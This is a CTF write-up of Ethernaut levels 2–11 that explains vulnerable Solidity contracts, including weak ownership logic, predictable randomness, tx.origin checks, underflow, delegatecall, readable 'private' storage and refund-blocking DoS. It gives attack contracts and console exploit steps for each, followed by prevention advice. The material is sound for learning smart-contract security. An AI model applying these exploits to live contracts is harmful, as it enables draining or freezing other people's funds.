# Ethernaut

> **CTF-style smart contract hacking challenges.**
> 
> This repo contains solutions and explanations for Ethernaut levels. Each branch corresponds to a different level.

<details>
<summary><strong>🪙 Level 2: Fallback</strong></summary>

### Overview

This challenge demonstrates how improper use of the `receive()` function and weak access control can allow attackers to take ownership of a contract and drain its funds.

The Fallback contract allows:
- Users to contribute small amounts of Ether.
- Ownership transfer to contributors who exceed the current owner’s contribution.
- Receiving Ether via `receive()` to also set the sender as the owner (if they have contributed before).

**Goal:** Become the owner of the contract and withdraw all funds.

---

### 🔍 Vulnerability Analysis

- **Weak Ownership Logic:**
  - Ownership can be reassigned if:
    - You send Ether directly to the contract using `receive()` **and**
    - You already have a non-zero contribution.
- **Lack of Proper Access Control:**
  - The `receive()` function is not protected by `onlyOwner`, so any contributor can trigger it to become the owner.
- **No Minimum Threshold for Ownership Transfer via receive():**
  - Any amount of Ether (>0) is enough to change the owner after a contribution.

---

### 🛠️ Exploitation Steps

1. **Make a Small Contribution**
   
   You must first contribute to have `contributions[msg.sender] > 0`:
   
   ```js
   await contract.contribute({ value: toWei("0.0000000000001") });
   await contract.getContribution(); // should be > 0
   ```

2. **Trigger `receive()` to Become Owner**
   
   Send Ether outside the ABI (direct transaction) to the contract address:
   
   ```js
   await contract.sendTransaction({
     to: "0xDBEBD77F08559597e2c4DA23520ca5603e151C66", // contract address
     value: toWei("0.0000000000001")
   });
   ```
   Now the `receive()` function runs and sets you as owner.

3. **Verify Ownership**
   
   ```js
   await contract.owner();
   // should return your wallet address
   ```

4. **Withdraw All Funds**
   
   ```js
   await contract.withdraw();
   ```
   All Ether in the contract is now transferred to your address.

---

### 🪲 Root Cause

The vulnerability stems from allowing state changes in `receive()` without proper access control.

> **Best practice:** Use `receive()` only for accepting Ether, not changing contract ownership.

---

### 🛡️ Prevention

- Never change ownership in `receive()` or `fallback()`.
- Use strict access control (`onlyOwner` or similar modifiers).
- Avoid logic in `receive()` that can be abused by anyone sending Ether.

---

</details>

<details>
<summary><strong>🪙 Level 3: Fal1out</strong></summary>

### Overview

In Solidity versions before 0.7.0, a constructor was defined by giving the function the same name as the contract. In this challenge, the intended constructor is misspelled as `Fal1out` instead of `Fallout`.

As a result, it is a public function that anyone can call—even after deployment—and it sets the `owner` variable to `msg.sender`. This lets us take ownership of the contract.

---

### 🔓 Vulnerable Code

```solidity
/* constructor */
function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

Because `Fal1out` is not recognized as a constructor, it becomes an external function that can be called by anyone.

---

### 🛠️ Exploitation Steps

1. **Deploy or create an instance of the challenge contract.**
2. **Call the `Fal1out()` function with your wallet:**
   ```js
   await contract.Fal1out();
   ```
3. **Verify ownership:**
   ```js
   await contract.owner(); // should return your address
   ```
4. **Withdraw funds:**
   - You are now the owner and can call `collectAllocations()` to withdraw funds.

---

### 📝 Key Takeaways

- In Solidity <0.7.0, constructors are identified by name matching the contract name exactly (case-sensitive).
- A typo in the constructor name turns it into a publicly callable function.
- From Solidity 0.7.0 onward, constructors are declared with the `constructor` keyword to avoid this issue.

---

</details>

<details>
<summary><strong>🪙 Level 4: Coin Flip</strong></summary>

### Vulnerable Contract & Problem

The original contract determines the coin flip outcome using:

```solidity
uint256 coinFlip = uint256(blockhash(block.number - 1)) / FACTOR;
```

- `blockhash(block.number - 1)` is publicly available, so anyone can predict the outcome before calling the function.
- `FACTOR` is a constant that makes `coinFlip` either 0 or 1.
- **Result:** The randomness is fully deterministic and predictable.

---

### 💥 Exploit Strategy

1. Read the blockchain’s last block hash using the same formula as the contract.
2. Calculate the expected outcome (`true` or `false`).
3. Submit the guess to the contract.
4. Repeat for 10 consecutive wins to complete the challenge.

---

### 🛡️ Attack Contract

<details>
<summary><code>// Hack.sol</code></summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Hack {
    uint256 private constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    CoinFlip private immutable coinFlip;

    constructor(address _coinFlip) {
        coinFlip = CoinFlip(_coinFlip);
    }

    function flip() external {
        bool guess = _guess();
        require(coinFlip.flip(guess), "Flip failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 flipResult = blockValue / FACTOR;
        return flipResult == 1;
    }
}
```

</details>

---

## 🛠️ Hack Contract (FlipCoin Branch)

### 🔑 How the Hack Works

- The Hack contract imports the vulnerable CoinFlip contract.
- `_guess()` replicates the calculation from the original contract.
- Both contracts run in the same transaction, sharing the same `block.number` and `blockhash`, ensuring the prediction is always correct.
- By calling `flip()` every block, the attacker gets a 100% win rate.

---

## ⚠️ Security Lessons

- On-chain randomness is **not secure** if it relies on predictable values like `blockhash` or `block.timestamp`.
- Use [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction/) or other verifiable randomness oracles for secure random numbers.
- Never assume miners won't manipulate predictable variables—they can influence them.

---

</details>

<details>
<summary><strong>🪙 Level 5: Telephone</strong></summary>

### 🎯 Objective

Become the owner of the Telephone contract.

---

### 🔍 Understanding the Vulnerability

The Telephone contract has a function:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

- `tx.origin` is the original externally-owned account (EOA) that started the transaction.
- `msg.sender` is the direct caller of the function.
- The condition `tx.origin != msg.sender` ensures you cannot call `changeOwner` directly from your wallet, because in that case both values would be the same.
- However, if you call `changeOwner` through another contract, then:
  - `tx.origin` will be your wallet address (EOA).
  - `msg.sender` will be the attacking contract’s address.
- This makes the condition `tx.origin != msg.sender` true, allowing us to change the owner.

---

### 🛠️ Exploit Strategy

Deploy an attacker contract that:
- Stores the target Telephone contract address.
- Calls `changeOwner(msg.sender)` on it.
- Call the attack function from your wallet so `msg.sender` in the target contract is the attacker contract’s address.
- This bypasses the `tx.origin` check and sets you as the owner.

---

### 💻 Exploit Code (Telephone branch)


### 📝 Step-by-Step Execution

1. **Deploy the HackTelephone contract** with the Telephone contract’s address as a constructor argument.
2. **Call `hackTelephone()` from your wallet.**
3. **Verify ownership in the console:**
   ```js
   await contract.owner(); // should return your wallet address
   ```

---

### ⚠️ Key Takeaway

- **Never rely on `tx.origin` for authentication checks.**
- Always use `msg.sender` to validate the caller, and implement proper access control with `onlyOwner` or similar patterns.

---

</details>

<details>
<summary><strong>🪙 Level 6: Token</strong></summary>

### 🎯 Objective

You start with 20 tokens. The goal is to increase your balance beyond the initial amount using the given smart contract.

---

### 🔍 Vulnerability

The `transfer` function has this check:

```solidity
require(balances[msg.sender] - _value >= 0);
```

- Since this contract is compiled with Solidity 0.6.0, arithmetic operations do **not** automatically revert on underflow/overflow.
- If you try to transfer more tokens than you have, `balances[msg.sender] - _value` underflows, wrapping around to a huge number (close to 2^256 - 1).
- This drastically increases your balance.

---

### 🛠️ Exploit Steps

1. **Deploy the level instance.**
2. **Call:**
   ```js
   await contract.transfer(<victim_address>, 21);
   ```
   Here, 21 is more than your balance (20), causing an underflow.
3. **Your balance will now be a huge number, completing the challenge.**

---

### 🧪 Proof of Concept (JavaScript Console)

```js
// Check initial balance
(await contract.balanceOf(player)).toString();
// > 20

// Exploit: Transfer more than you have
await contract.transfer("0x0000000000000000000000000000000000000000", 21);

// Check balance again
(await contract.balanceOf(player)).toString();
// > Very large number (underflow occurred)
```

---

### 📝 Key Takeaways

- Before Solidity 0.8.0, arithmetic was unchecked by default, allowing underflows and overflows.
- Always use SafeMath (or Solidity 0.8+ built-in checks) for safe arithmetic.
- Never assume `require(x - y >= 0)` will prevent negatives — with unsigned integers, negatives don't exist, they wrap.

---

</details>

<details>
<summary><strong>🪙 Level 7: Delegation</strong></summary>

### 🎯 Challenge Goal

Become the owner of the Delegation contract without directly calling its functions.

---

### 🔍 Vulnerability Explanation

The Delegation contract uses a `fallback()` function that executes:

```solidity
(bool result,) = address(delegate).delegatecall(msg.data);
```

- `delegatecall` executes the code from `delegate` (the Delegate contract) in the context of Delegation's storage.
- This means that if we trigger a function in Delegate (like `pwn()`), it will modify Delegation's `owner` variable, not Delegate's.
- Since `pwn()` sets:
  ```solidity
  owner = msg.sender;
  ```
  Calling it via `delegatecall` will set our address as owner in Delegation.

---

### 🛠️ Exploit Steps

1. **Craft a transaction to call `pwn()` on the Delegation contract** without directly calling it.
   - We do this by sending the function selector of `pwn()` to the Delegation contract.
2. **The `fallback()` function in Delegation will forward this call to Delegate** using `delegatecall`.
3. **The code in `pwn()` will run, setting `owner` in the Delegation contract to our address.**

4. **Important:** Call from your EOA (not via a contract). If you trigger `pwn()` through an attacking contract, that contract becomes the owner. Use Remix or a console to send the `pwn()` selector directly from your wallet.

---

### 📚 Detailed Explanation

If you didn't get the 2nd point, here's a brief explanation:

Let's slow it down and make the `fallback()` + `delegatecall` part crystal clear, step by step, because that's the key to understanding this Ethernaut challenge.

#### 1️⃣ What `fallback()` does in Solidity

The `fallback()` function is automatically triggered when:
- You send a transaction to a contract that doesn't match any existing function.
- Or you send raw data that doesn't match any function signature.

**Example:**
```solidity
fallback() external payable {
    // runs if no other function matches
}
```

So if we call Delegation with `pwn()` data, but Delegation has no function named `pwn`, `fallback()` will execute.

</details>

<details>
<summary><strong>🪙 Level 8: Vault</strong></summary>

### Overview

This challenge demonstrates a fundamental misconception about privacy in Ethereum smart contracts. The `private` keyword in Solidity only restricts access from other contracts during execution—it does not hide data from off-chain observers.

All contract storage is publicly readable on the blockchain, making "private" variables accessible to anyone who knows how to read storage slots.

**Goal:** Unlock the vault by setting `locked = false`.

---

### 🔍 Vulnerability Analysis

- **Misunderstanding of `private` Visibility:**
  - The `password` variable is marked as `private`, but this only prevents other contracts from accessing it during execution.
  - All storage data remains publicly readable on the blockchain.
- **No Encryption:**
  - The password is stored as plain text in storage, not encrypted.
- **Predictable Storage Layout:**
  - Solidity stores variables sequentially in storage slots, making it easy to determine which slot contains the password.

---

### 🛠️ Exploitation Steps

1. **Understand Storage Layout**
   
   The contract stores variables in this order:
   - Slot 0: `bool public locked`
   - Slot 1: `bytes32 private password`

2. **Read the Password from Storage**
   
   Use `web3.eth.getStorageAt()` to read the password from slot 1:
   
   ```js
   const password = await web3.eth.getStorageAt(instance, 1);
   console.log("Password:", password);
   ```

3. **Unlock the Vault**
   
   Call the `unlock()` function with the retrieved password:
   
   ```js
   await contract.unlock(password);
   ```

4. **Verify Success**
   
   Check that the vault is now unlocked:
   
   ```js
   const locked = await contract.locked();
   console.log("Vault locked:", locked); // should be false
   ```

---

### 📚 Detailed Explanation

#### Storage Visibility in Ethereum

In Ethereum, all contract storage is publicly readable. The `private` keyword in Solidity only affects:
- **Compile-time access:** Other contracts cannot directly reference private variables
- **Runtime access:** Private variables cannot be accessed by other contracts during execution

However, **off-chain observers can always read any storage slot** using:
- Block explorers
- RPC calls like `eth_getStorageAt`
- Web3 libraries

#### Storage Layout

Solidity stores variables sequentially in 32-byte storage slots:
```solidity
contract Vault {
    bool public locked;          // Slot 0 (32 bytes, but bool only uses 1 byte)
    bytes32 private password;    // Slot 1 (32 bytes)
}
```

Since `bool` variables only use 1 byte, the remaining 31 bytes in slot 0 are unused but still part of the slot.

---

### 🪲 Root Cause

The vulnerability stems from the misconception that `private` variables are hidden from off-chain observers. In reality, Ethereum's transparency means all data is publicly accessible.

> **Key takeaway:** `private` in Solidity ≠ private in traditional programming. It only restricts contract-to-contract access, not blockchain visibility.

---

### 🛡️ Prevention

- **Never store sensitive data in plain text** on the blockchain
- **Use encryption** for sensitive data if it must be stored
- **Implement access control** rather than relying on visibility modifiers
- **Consider off-chain storage** for truly sensitive information
- **Educate developers** about blockchain transparency

---

### 🧪 Complete Exploit Code

```js
// 1) Read the password from storage slot 1
const password = await web3.eth.getStorageAt(instance, 1);
console.log("Retrieved password:", password);

// 2) Unlock the vault using the password
await contract.unlock(password);

// 3) Verify the vault is unlocked
const locked = await contract.locked();
console.log("Vault locked:", locked);

// 4) Confirm success
if (!locked) {
    console.log("✅ Vault successfully unlocked!");
} else {
    console.log("❌ Vault still locked");
}
```

---

### 🔗 Related Concepts

- **Storage Layout:** Understanding how Solidity organizes contract storage
- **Blockchain Transparency:** Why all on-chain data is public
- **Access Control:** Proper ways to restrict functionality
- **Data Privacy:** Strategies for handling sensitive information on public blockchains

</details>

<details>
<summary><strong>🪙 Level 9: King</strong></summary>

### Overview

This level is a "King of the Hill" contract. To become the new king, a caller must pay at least the current `prize`. The contract then tries to refund the previous king using `transfer` before updating the state. If the refund fails, the whole transaction reverts.

**Goal:** Become king and lock the contract so no one can dethrone you.

---

### 🔓 Vulnerable Code (core idea)

<details>
<summary><code>contract King {</code></summary>

```solidity
contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value); // <--- external call that can revert
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

</details>

---

### 🔍 Vulnerability Analysis

- **Push payments with `transfer`:** The contract sends ETH to the previous king using `transfer`, which forwards 2300 gas and reverts on any failure.
- **State updated after external call:** If the refund reverts, the contract never reaches the state update, so no one can become the new king.
- **Malicious recipient can force failure:** A contract can intentionally revert in `receive()`/`fallback()`, causing every dethroning attempt to fail.

---

### 🛡️ Attack Contract

<details>
<summary><code>// SPDX-License-Identifier: MIT</code></summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IKing {
    function prize() external view returns (uint256);
}

contract KingAttack {
    address payable public target;

    constructor(address payable _target) {
        target = _target;
    }

    // Send enough ETH to claim kingship
    function attack() external payable {
        (bool ok, ) = target.call{value: msg.value}("");
        require(ok, "call failed");
    }

    // Block all refunds to lock the game
    receive() external payable { revert("no refunds"); }
    fallback() external payable { revert("no refunds"); }
}
```

</details>

---

### 🧪 Exploitation Steps

1. Read the current `prize`:
   ```js
   const prize = await contract.prize();
   ```
2. Deploy `KingAttack` with the level instance address.
3. Call `attack()` and send `value: prize` (or `prize + 1`):
   ```js
   await kingAttack.attack({ value: prize });
   ```
4. Verify you are the king:
   ```js
   await contract._king(); // should be kingAttack address
   ```
5. Try dethroning from an EOA with more ETH — it should revert because your contract rejects the refund.

---

### 📚 Detailed Explanation

- **`transfer` forwards 2300 gas:** This is barely enough for a simple `LOG` and no storage writes. If the recipient reverts or is non-payable, the `transfer` reverts the entire transaction.
- **Push vs Pull payments:** Pushing ETH during state transitions creates a hard dependency on recipients. If they cannot receive, your logic breaks.
- **External call before state update:** Combining an external call with state updates in the same function increases fragility and attack surface.

---

### 🪲 Root Cause

Relying on push-based refunds with `transfer` during the critical path of state updates. A refund failure prevents updating the king, allowing a malicious king to brick the contract.

---

### 🛡️ Prevention

- Prefer the **withdraw (pull) pattern**: record balances owed and let users withdraw later.
- Avoid `transfer`/`send`; use low-level `call` and handle failures gracefully if you must send.
- Apply **checks-effects-interactions**: update state first, then interact, or decouple payments entirely.
- Consider adding an emergency path or owner override (carefully designed) to recover from blocked refunds.

---

### 🧪 Complete Exploit (JS + Solidity)

<details>
<summary><code>// KingAttack.sol</code></summary>

```solidity
// KingAttack.sol
pragma solidity ^0.8.0;
contract KingAttack {
    address payable public target;
    constructor(address payable _target) { target = _target; }
    function attack() external payable {
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "call failed");
    }
    receive() external payable { revert("no refunds"); }
    fallback() external payable { revert("no refunds"); }
}
```

</details>

<details>
<summary><code>// Console</code></summary>

```js
// Console
const prize = await contract.prize();
await kingAttack.attack({ value: prize });
await contract._king(); // => kingAttack address
```

</details>

---

### 🔗 Related Concepts

- **Push vs Pull Payments**
- **`transfer`/`send` vs `call`**
- **Checks-Effects-Interactions**
- **Denial-of-Service via unexpected revert**

</details>

<details>
<summary><strong>🪙 Level 10: Elevator</strong></summary>

### Overview

The `Elevator` contract asks an external contract (treated as `Building`) whether a floor is the last one. It calls `isLastFloor` twice and makes a decision based on the answers. Because it fully trusts the external response, an attacker can return different answers on each call to set `top = true`.

**Goal:** Reach the top floor by setting `top = true`.

---

### 🔓 Vulnerable Contract (simplified)

<details>
<summary><code>contract Elevator {</code></summary>

```solidity
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        if (!Building(msg.sender).isLastFloor(_floor)) {
            floor = _floor;
            top = Building(msg.sender).isLastFloor(floor);
        }
    }
}
```

</details>

---

### 🔍 Vulnerability Analysis

- **Untrusted callback controls logic:** The contract trusts `Building(msg.sender)` to answer security-critical questions.
- **Inconsistent responses enable bypass:** Because `isLastFloor` is not `view`, the callee can return `false` first and `true` later in the same transaction.
- **Double-check pattern is exploitable:** The second call can differ from the first, allowing `top` to be set to `true`.

---

### 🛡️ Attack Contract

<details>
<summary><code>// ElevatorAttack.sol</code></summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
    function top() external view returns (bool);
}

contract ElevatorAttack {
    IElevator public target;
    bool private toggled;

    constructor(address _target) {
        target = IElevator(_target);
    }

    function attack(uint256 _floor) external {
        target.goTo(_floor);
        require(target.top(), "Not at top");
    }

    // Called by Elevator via Building(msg.sender)
    function isLastFloor(uint256) external returns (bool) {
        bool answer = toggled; // false on first call, true on second
        toggled = !toggled;
        return answer;
    }
}
```

</details>

---

### 🧪 Exploitation Steps

1. Deploy `ElevatorAttack` with the target `Elevator` address.
2. Call `attack(1)` to trigger `goTo(1)`.
3. The first `isLastFloor` returns `false` → contract sets `floor`.
4. The second `isLastFloor` returns `true` → contract sets `top = true`.
5. Verify `top` is now `true`.

---

### 📚 Detailed Explanation

- The `Elevator` contract expects the caller to implement `isLastFloor`. By initiating the call from our attack contract, `msg.sender` inside `Elevator` is our contract, so `Elevator` calls back into us.
- Because `isLastFloor` is not marked `view`, the implementation can track state and alternate answers across calls within the same transaction.
- Returning `false` first and `true` second satisfies the `Elevator` logic to set `top = true`.

---

### 🪲 Root Cause

Trusting an untrusted external callback for a security-critical decision without constraining behavior (e.g., requiring `view`/determinism) or establishing a trusted `Building` address.

---

### 🛡️ Prevention

- Avoid trusting callbacks from arbitrary callers for critical logic.
- If callbacks are unavoidable, constrain them (e.g., `view`/`pure`) and enforce a trusted `Building` address set by the owner.
- Validate invariants independently rather than relying entirely on external responses.

---

### 🧪 Complete Exploit (Console)

<details>
<summary><code>// Hardhat/Foundry console</code></summary>

```js
// instance = address of the deployed Elevator level instance
const Attack = await ethers.getContractFactory("ElevatorAttack");
const attack = await Attack.deploy(instance);
await attack.deployed();

await attack.attack(1);
const elevator = await ethers.getContractAt("Elevator", instance);
console.log("top:", await elevator.top()); // true
```

</details>

---

### 🔗 Related Concepts

- Callback-based design and trust boundaries
- Determinism (`view`/`pure`) in external interfaces
- Cross-contract control flow and reentrancy-like logic pitfalls

</details>

<details>
<summary><strong>🪙 Level 11: Privacy</strong></summary>

### Overview

The `Privacy` contract appears to hide sensitive data using `private` variables. In Solidity, `private` only restricts access from other contracts at compile/runtime. It does not hide data from off-chain reads. All contract storage is publicly readable on the blockchain.

**Goal:** Unlock the contract by providing the correct `bytes16` key stored in `data[2]`.

---

### 🔓 Vulnerable Contract (simplified)

<details>
<summary><code>contract Privacy {</code></summary>

```solidity
contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

</details>

---

### 🔍 Vulnerability Analysis

- **Private ≠ hidden:** `private` only limits contract-to-contract access; storage remains public off-chain.
- **Authorization by secret in storage:** The contract uses a value from `data[2]` as a secret key.
- **Deterministic storage layout:** Knowing the layout lets us read the key directly.

---

### 🛠️ Exploitation Steps

1. Determine storage slots:
   - Slot 0: `locked`
   - Slot 1: `ID`
   - Slot 2: `flattening`, `denomination`, `awkwardness` (packed)
   - Slot 3: `data[0]`
   - Slot 4: `data[1]`
   - Slot 5: `data[2]` ✅
2. Read slot 5 via RPC.
3. Cast the `bytes32` value to `bytes16` (left 16 bytes) and call `unlock(key)`.

---

### 📚 Detailed Explanation (Storage Layout)

Solidity stores state variables in 32-byte slots sequentially. Small types are tightly packed into a single slot when possible. Arrays of fixed-length elements like `bytes32[3]` occupy consecutive whole slots.

---

### 🧨 Attack Contract

<details>
<summary><code>// PrivacyAttack.sol</code></summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyAttack {
    IPrivacy private immutable target;

    constructor(address _target) {
        target = IPrivacy(_target);
    }

    function attack(bytes32 slotValue) external {
        bytes16 key = bytes16(slotValue); // take first 16 bytes
        target.unlock(key);
    }
}
```

</details>

---

### 🧪 Console (read slot and unlock)

<details>
<summary><code>// web3.js</code></summary>

```js
// instance = address of Privacy level instance
const slot5 = await web3.eth.getStorageAt(instance, 5);
// Call unlock directly if you have the contract object
await contract.unlock(slot5.slice(0, 34)); // first 16 bytes (0x + 32 hex chars)
// Or send full bytes32; Solidity will truncate to bytes16
await contract.unlock(slot5);
```

</details>

<details>
<summary><code>// ethers.js</code></summary>

```js
const slot5 = await ethers.provider.getStorageAt(instance, 5);
const privacy = await ethers.getContractAt("Privacy", instance);
await privacy.unlock(slot5); // bytes32 will be cast to bytes16 by the contract
```

</details>

---

### 🪲 Root Cause

Relying on secrecy of on-chain storage for access control. On a public blockchain, storage is transparent and cannot be treated as confidential.

---

### 🛡️ Prevention

- Never store secrets (keys/passwords) in plaintext on-chain.
- Use commit-reveal schemes or off-chain derived values.
- If data must be stored, store only hashes and verify preimages provided by users.
- Educate teams that Solidity visibility modifiers do not imply privacy from observers.

---

### 🔗 Related Concepts

- Storage layout and variable packing
- Reading storage via `eth_getStorageAt`
- Data confidentiality on public blockchains

</details>